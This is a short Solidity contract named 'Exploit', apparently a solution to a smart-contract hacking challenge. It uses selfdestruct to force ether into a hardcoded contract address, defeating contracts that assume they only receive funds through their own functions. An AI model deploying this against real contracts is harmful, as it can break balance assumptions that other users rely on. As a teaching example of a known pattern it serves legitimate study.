// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Exploit {
    function exploit() external payable {
        // Force a deposit of ether by self-destructing the contract
        address _contractAddr = 0xa5A40c693Ab623597C392CD6Af62d81827d16CB0;
        selfdestruct(payable(_contractAddr));
    }
}